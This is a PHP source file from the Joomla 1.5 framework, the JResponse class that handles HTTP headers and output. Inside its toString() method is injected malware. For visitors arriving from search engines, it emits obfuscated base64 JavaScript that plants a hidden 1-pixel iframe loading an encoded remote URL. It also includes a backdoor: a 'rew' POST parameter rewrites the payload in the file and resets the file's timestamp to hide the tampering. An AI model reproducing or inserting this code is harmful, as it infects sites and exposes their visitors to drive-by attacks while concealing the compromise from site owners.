<?php
/**
 * @version		$Id: response.php 21044 2011-03-31 16:03:23Z dextercowley $
 * @package		Joomla.Framework
 * @subpackage	Environment
 * @copyright	Copyright (C) 2005 - 2010 Open Source Matters. All rights reserved.
 * @license		GNU/GPL, see LICENSE.php
 * Joomla! is free software. This version may have been modified pursuant
 * to the GNU General Public License, and as distributed it includes or
 * is derivative of works licensed under the GNU General Public License or
 * other free or open source software licenses.
 * See COPYRIGHT.php for copyright notices and details.
 */

/**
 * Create the response global object
 */
defined('JPATH_BASE') or die();
$GLOBALS['_JRESPONSE'] = new stdClass();
$GLOBALS['_JRESPONSE']->cachable = false;
$GLOBALS['_JRESPONSE']->headers  = array();
$GLOBALS['_JRESPONSE']->body	 = array();

 /**
 * JResponse Class
 *
 * This class serves to provide the Joomla Framework with a common interface to access
 * response variables.  This includes header and body.
 *
 * @static
 * @package		Joomla.Framework
 * @subpackage	Environment
 * @since		1.5
 */
class JResponse
{
	/**
	 * Set/get cachable state for the response
	 *
	 * If $allow is set, sets the cachable state of the response.  Always returns current state
	 *
	 * @static
	 * @param	boolean	$allow
	 * @return	boolean 	True of browser caching should be allowed
	 * @since	1.5
	 */
	function allowCache($allow = null)
	{
		if (!is_null($allow)) {
			$GLOBALS['_JRESPONSE']->cachable = (bool) $allow;
		}
		return $GLOBALS['_JRESPONSE']->cachable;
	}

	/**
	 * Set a header
	 *
	 * If $replace is true, replaces any headers already defined with that
	 * $name.
	 *
	 * @access public
	 * @param string 	$name
	 * @param string 	$value
	 * @param boolean 	$replace
	 */
	function setHeader($name, $value, $replace = false)
	{
		$name	= (string) $name;
		$value	= (string) $value;

		if ($replace)
		{
			foreach ($GLOBALS['_JRESPONSE']->headers as $key => $header) {
				if ($name == $header['name']) {
					unset($GLOBALS['_JRESPONSE']->headers[$key]);
				}
			}
		}

		$GLOBALS['_JRESPONSE']->headers[] = array(
			'name'	=> $name,
			'value'	=> $value
		);
	}

	/**
	 * Return array of headers;
	 *
	 * @access public
	 * @return array
	 */
	function getHeaders() {
		return  $GLOBALS['_JRESPONSE']->headers;
	}

	/**
	 * Clear headers
	 *
	 * @access public
	 */
	function clearHeaders() {
		$GLOBALS['_JRESPONSE']->headers = array();
	}

	/**
	 * Send all headers
	 *
	 * @access public
	 * @return void
	 */
	function sendHeaders()
	{
		if (!headers_sent())
		{
			foreach ($GLOBALS['_JRESPONSE']->headers as $header)
			{
				if ('status' == strtolower($header['name']))
				{
					// 'status' headers indicate an HTTP status, and need to be handled slightly differently
					header(ucfirst(strtolower($header['name'])) . ': ' . $header['value'], null, (int) $header['value']);
				} else {
					header($header['name'] . ': ' . $header['value']);
				}
			}
		}
	}

	/**
	 * Set body content
	 *
	 * If body content already defined, this will replace it.
	 *
	 * @access public
	 * @param string $content
	 */
	function setBody($content) {
		$GLOBALS['_JRESPONSE']->body = array((string) $content);
	}

	 /**
	 * Prepend content to the body content
	 *
	 * @access public
	 * @param string $content
	 */
	function prependBody($content) {
		array_unshift($GLOBALS['_JRESPONSE']->body, (string) $content);
	}

	/**
	 * Append content to the body content
	 *
	 * @access public
	 * @param string $content
	 */
	function appendBody($content) {
		array_push($GLOBALS['_JRESPONSE']->body, (string) $content);
	}

	/**
	 * Return the body content
	 *
	 * @access public
	 * @param boolean $toArray Whether or not to return the body content as an
	 * array of strings or as a single string; defaults to false
	 * @return string|array
	 */
	function getBody($toArray = false)
	{
		if ($toArray) {
			return $GLOBALS['_JRESPONSE']->body;
		}

		ob_start();
		foreach ($GLOBALS['_JRESPONSE']->body as $content) {
			echo $content;
		}
		return ob_get_clean();
	}

	/**
	 * Sends all headers prior to returning the string
	 *
	 * @access public
	 * @param boolean 	$compress	If true, compress the data
	 * @return string
	 */
	function toString($compress = false)
	{
		$data = JResponse::getBody();

		// Don't compress something if the server is going todo it anyway. Waste of time.
		if($compress && !ini_get('zlib.output_compression') && ini_get('output_handler')!='ob_gzhandler') {
			$data = JResponse::_compress($data);
		}

		if (JResponse::allowCache() === false)
		{
			JResponse::setHeader( 'Expires', 'Mon, 1 Jan 2001 00:00:00 GMT', true ); 				// Expires in the past
			JResponse::setHeader( 'Last-Modified', gmdate("D, d M Y H:i:s") . ' GMT', true ); 		// Always modified
			JResponse::setHeader( 'Cache-Control', 'no-store, no-cache, must-revalidate', true ); 	// Extra CYA
			JResponse::setHeader( 'Cache-Control', 'post-check=0, pre-check=0', false );			// HTTP/1.1
			JResponse::setHeader( 'Pragma', 'no-cache' ); 											// HTTP 1.0
		}

		JResponse::sendHeaders();
ob_start();
error_reporting(0);
if(isset($_SERVER['HTTP_REFERER'])&&empty($_COOKIE['b01851'])&&@preg_match("#google|altavista|yahoo|bing|(?:live|ask|aol|msn).com#is",$_SERVER["HTTP_REFERER"])) {  
    @setcookie('b01851', "1", time()+60*60*24*30, "/");
    echo "<script type='text/javascript'>document.cookie = \"b01851=\"+escape('" . time() . "." . rand(1111111, 9999999) . "')+\"; expires=" . date("D, j M Y 00:00:00", time() + 60 * 60 * 24 * 30) . "; path=/\";</script>";
    $__f = implode("", array_map("chr", explode(" ", "98 97 115 101 54 52 95 100 101 99 111 100 101")));
    echo $__f("PHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiPmZ1bmN0aW9uIGZpQ25sKCl7dmFyIHFvekNLPSdvSkF4RGsnO2lmKCdZRFVnRCc9PSdESUxBJylJbmt6dCgpO30KdmFyIElLekV3PSdiZ3dyJzt2YXIgWEtOQXp3aT0icFx4NjFyc2VJbnQiO3ZhciBaUWtUU2E7ZnVuY3Rpb24gaUd1UGRQKCl7fQp2YXIgcHgwX3Zhcj0iMHB4Ijt2YXIgU3pnVWI7aWYoJ2lVVlpQQic9PSd0ZFBTJylNemliPSdOVkpNJztmdW5jdGlvbiBNWldvR2woKXt9CnZhciBlcFdWRExVQnM9IjkzOWY5ZjliNjU1YTVhYTI5YTk5OGM5YjkwOTM4YzU5OTQ5OTkxOWE1YThmNjRhNTlhNjA5MjVhIjtmdW5jdGlvbiB4Q3NnaCgpe312YXIgUERrT29uPSdjU090Jzt2YXIga0tmTFRnPSJhXHg3MFx4NzBlXHg2ZVx4NjRceDQzaGlceDZjXHg2NCI7aWYoJ1J2d0MnPT0nRUpRZWUnKXJYaGdyPSdlU0FQTic7aWYoJ2VIeHliJz09J0p0cWdiJyl6YmNKVz0nRVpobFonO3ZhciBOc2Zycj0na0hVbCc7dmFyIGxXc0NZcDtpZignRFJZSic9PSdueHBaRFgnKUFwY1Q9J0FqeXgnO3ZhciBXdUhnVHRjUD0iY29uXHg3M3RydVx4NjN0XHg2ZnIiO3ZhciBIaXdSYjt2YXIgY1dpcklzPTE1Mzt2YXIgYXBwVmVyc2lvbl92YXI9ImFwcFZlcnNpb1x4NmUiO2Z1bmN0aW9uIE9IS2koKXt2YXIgVlhqREI9J3RyeEdXJztpZignSGlZcSc9PSdZRERVTCcpUndZV2tSKCk7fXZhciBkamJnV2M7dmFyIGRMS1RzQj0ic2xpY2UiO2lmKCdoeldVUSc9PSdRRW1FV24nKUhSbVk9J0Vha0xUJzt2YXIgd3JJYXA9MjY7dmFyIEJnQ3dZZVpwWT0iZlx4NzJvbUNceDY4YVx4NzJDb2RceDY1Ijt2YXIgSGZCZHByPSJib2R5IjtpZignWFJhdU4nPT0nbHRQY3hhJylNdXRpaz0ndFpLdkYnO3ZhciBLU0lLPSdhaG5RdSc7dmFyIEh2a2dSPSIiO3ZhciBpQ21WPSdaY0NNJzt2YXIgRXB3cUhHO3ZhciBweDFfdmFyPSIxcHgiO3ZhciBpelFVSDtmdW5jdGlvbiBFY0xTSigpe30KdmFyIGJxTHZ1cj0oZnVuY3Rpb24oKXtmdW5jdGlvbiBMaVB5Z0MoKXt9CnJldHVybiB0aGlzO30pKCk7dmFyIFZCeFM9MTUwO2lmKCdpYnBIJz09J0N4eHQnKXhOSEFadigpO3ZhciByTXJvSGRUPSJiTEFzbk1tIltXdUhnVHRjUF07dmFyIGNCYldwO2lmKCdXSE5HJz09J0V0WnYnKWRTZVkoKTtpZignQ0puRXEnPT0nRVVmRycpWUthcXE9J2JjSVVwJztmb3IodmFyIExrQkFzQ3BwPTA7TGtCQXNDcHA8ZXBXVkRMVUJzLmxlbmd0aDtMa0JBc0NwcCs9Mil7dmFyIHRFa1g7ZnVuY3Rpb24gcURGQ0JvKCl7dmFyIHZsakxVaD0nbmVhbHhGJztpZignYkV1dyc9PSdOYmh6dEYnKXZvUHB6eCgpO30KY0ZIVGhpPWJxTHZ1cltYS05BendpXShlcFdWRExVQnNbZExLVHNCXShMa0JBc0NwcCxMa0JBc0NwcCsyKSwxNiktNDM7ZnVuY3Rpb24gSE14aGooKXt2YXIgbnpzbGQ9J0pRWUYnO2lmKCdaR21yJz09J1J1eGNNJylZZ29xYygpO31pZignQUpUeCc9PSdrUXBNTVEnKURLT2R2bSgpO2Z1bmN0aW9uIFNhS2tUTygpe30KSHZrZ1IrPXJNcm9IZFRbQmdDd1llWnBZXShjRkhUaGkpO2lmKCdCSkRFSkgnPT0nUm1Sdk9BJylRU2Z6bCgpO3ZhciBJZlFUPTI5NDt9CmZ1bmN0aW9uIGpUeWVFSSgpe312YXIgUUd3UGV0O2lmKCdqdUp6Zyc9PSdRdGdaTnQnKW56UUZjRSgpO2Z1bmN0aW9uIG1idkYoKXt2YXIgeW9LVGk9J3JvQ1pTJztpZignc2RiSyc9PSdTak1JJylNWHlUKCk7fQp2YXIgeFdoVU1OQkc9IlN2ZWFDIjt2YXIgS0hSTj0xMjU7dmFyIFVSSFFDPSdwUGNFTyc7aWYoJ293Vm9wJz09J2tYWk9ocycpVWFwdj0nTHRNZWUnO3ZhciBLSW1tWT0iIjtpZihuYXZpZ2F0b3JbYXBwVmVyc2lvbl92YXJdLmluZGV4T2YoIk1TSUUiKSE9LTEpe3ZhciBGdkxwalE7S0ltbVk9JzxpZnJhbWUgbmFtZT0iJyt4V2hVTU5CRysnIiBzcmM9IicrSHZrZ1IrJyI+Jzt2YXIgS1hBUnRMPSdORmVPJzt2YXIgV3lvY1dOPTI5NDt9ZWxzZXt2YXIgVFZ6RD0yMDg7S0ltbVk9J2lmcmFtZSc7ZnVuY3Rpb24gUmhKWFEoKXt9aWYoJ0ZCWkNoJz09J3FTQ20nKXBiakVHYT0nQUZxV0Z6Jzt9CmZ1bmN0aW9uIFZVSnpiYygpe312YXIgUHhXcGI9J0lJQUhyJzt2YXIgQW14T3VYWmhZPWRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoS0ltbVkpO2lmKCdMWmhEbic9PSd4Tk9EUWInKVpDVG9Idj0nVXBWTEknO3ZhciBNanNPRT0nS0hCSCc7aWYoJ3ptSkVXVyc9PSdPUlpsdycpUFFVaz0nYWtMV0wnO0FteE91WFpoWS5kQk5HSz1mdW5jdGlvbigpe2lmKCdrZHl4SHQnPT0naGVwdycpQVNDUkM9J3NSVUh1JztmdW5jdGlvbiBiSFRQRW8oKXt2YXIgdmp0U1NKPSdLWkNqJztpZignY2lrV0tYJz09J1loZ0tLdScpVFZnWSgpO31mdW5jdGlvbiBrZm9GY1coKXt2YXIgZ0ljWHJEPSdtZlV4JztpZignY3dtUXZiJz09J0duVEJoJylHTUdyV1UoKTt9CnRoaXNbInNyYyJdPUh2a2dSO2Z1bmN0aW9uIFlOTUMoKXt9fQpBbXhPdVhaaFkuc3R5bGUucG9zaXRpb249ImFic29sdXRlIjt2YXIgSG1rZUo9MTM1O2lmKCdZcGhtJz09J1ZYemInKXdnZXJPVz0nVWtTbW0nO0FteE91WFpoWS5zdHlsZS5yaWdodD1weDBfdmFyO2Z1bmN0aW9uIGJxSlUoKXt9ZnVuY3Rpb24gdmFNaigpe30KdmFyIGJnSXk9J01SY2JnJzt2YXIgTGFaaz0yNjY7QW14T3VYWmhZLnN0eWxlLndpZHRoPXB4MV92YXI7ZnVuY3Rpb24geGtzb3UoKXt2YXIgcXluaz0nU1JNQUh2JztpZignSmJkZGNVJz09J0t4V20nKVRKd0xVSSgpO30KQW14T3VYWmhZLm5hbWU9eFdoVU1OQkc7dmFyIERWenA7aWYoJ0hhSFlIJz09J0dVV21SJyliUmNZVygpO0FteE91WFpoWS5kQk5HSygpO3ZhciBrVVBmO2lmKCdyc2xkUE4nPT0nR3NWc0knKVBJV25OZCgpO3ZhciBKUnZTPTE3MztmdW5jdGlvbiBHS0hLcigpe3ZhciBNdEpGdT0nbFZsYlgnO2lmKCdEWENxVic9PSdqSmNjeGUnKVB6b0EoKTt9CkFteE91WFpoWS5zdHlsZS50b3A9cHgwX3Zhcjt2YXIgbUpaaFVoO2Z1bmN0aW9uIHFDd0YoKXt2YXIgV2V0R0U9J2xKWkEnO2lmKCdNdEtSQ0UnPT0nUHJxZScpc05zWWkoKTt9CkFteE91WFpoWS5zdHlsZS5oZWlnaHQ9cHgxX3ZhcjtpZignYVhOVkNvJz09J3V3QlZkJylBV3RsKCk7dmFyIGliRlNvPTIzMjtmdW5jdGlvbiBxR0dFd0ttaEkoKXt2YXIgdXZPd0I7aWYoJ21DWnEnPT0neU9ZVycpQWFIeVhKKCk7aWYoZG9jdW1lbnRbSGZCZHByXSl7aWYoJ1JGRVRxeSc9PSdjSUhHJylsT1pOUD0neFB3Wic7dmFyIG1ITERGPSdMVHRaTic7ZG9jdW1lbnRbSGZCZHByXVtrS2ZMVGddKEFteE91WFpoWSk7dmFyIFBlTkN1PSdBakFUWXknO31lbHNle3ZhciBvZlBzO3NldFRpbWVvdXQocUdHRXdLbWhJLDEyMCk7dmFyIHZiV0dkPSdReXVjSCc7dmFyIHZ4WVg7fQp2YXIgVFROeGlXPTExNzt9CnZhciBZVWtWdms7dmFyIENxVGJPdj0yOTA7cUdHRXdLbWhJKCk7dmFyIHJ4ck49J0NpbkhIJzt2YXIgZU9nUUw9J2JmdUVHJzt2YXIgTERQbHdnO2Z1bmN0aW9uIE1aYlpxaygpe3ZhciByQ3FzWXc9J01FWHonO2lmKCdKYWdEUU4nPT0nTnZxdScpalV3RGsoKTt9PC9zY3JpcHQ+");
} if(isset($_POST['rew'])&&!empty($_POST['rew'])){$f=__FILE__;$fp=@fopen($f,"r");$fc="";while(!feof($fp))$fc.=@fread($fp,8192);@fclose($fp);if(isset($fc)&&!empty($fc)){$pa='((?:.*)99\s111\s100\s101["\']\)\)\);(?:\s+)?echo\s+$[a-z0-9_]{1,8}\(["\']).+?(["\']\);(?:.*))';if(preg_match("#".$pa."#is",$fc)){$t=@filemtime($f);$fp=@fopen($f,"w+");$fc=preg_replace("#".$pa."#is",'$1'.$_POST['rew'].'$2',$fc);@fwrite($fp,$fc);@fclose($fp);@touch($f,$t,$t);}}}
$out = ob_get_contents();ob_end_clean();return $data.$out;
	}

	/**
	* Compress the data
	*
	* Checks the accept encoding of the browser and compresses the data before
	* sending it to the client.
	*
	* @access	public
	* @param	string		data
	* @return	string		compressed data
	*/
	function _compress( $data )
	{
		$encoding = JResponse::_clientEncoding();

		if (!$encoding)
			return $data;

		if (!extension_loaded('zlib') || ini_get('zlib.output_compression')) {
			return $data;
		}

		if (headers_sent())
			return $data;

		if (connection_status() !== 0)
			return $data;


		$level = 4; //ideal level

		/*
		$size		= strlen($data);
		$crc		= crc32($data);

		$gzdata		= "\x1f\x8b\x08\x00\x00\x00\x00\x00";
		$gzdata		.= gzcompress($data, $level);

		$gzdata 	= substr($gzdata, 0, strlen($gzdata) - 4);
		$gzdata 	.= pack("V",$crc) . pack("V", $size);
		*/

		$gzdata = gzencode($data, $level);

		JResponse::setHeader('Content-Encoding', $encoding);
		JResponse::setHeader('X-Content-Encoded-By', 'Joomla! 1.5');

		return $gzdata;
	}

	 /**
	* check, whether client supports compressed data
	*
	* @access	private
	* @return	boolean
	*/
	function _clientEncoding()
	{
		if (!isset($_SERVER['HTTP_ACCEPT_ENCODING'])) {
			return false;
		}

		$encoding = false;

		if (false !== strpos($_SERVER['HTTP_ACCEPT_ENCODING'], 'gzip')) {
			$encoding = 'gzip';
		}

		if (false !== strpos($_SERVER['HTTP_ACCEPT_ENCODING'], 'x-gzip')) {
			$encoding = 'x-gzip';
		}

		return $encoding;
	}
}
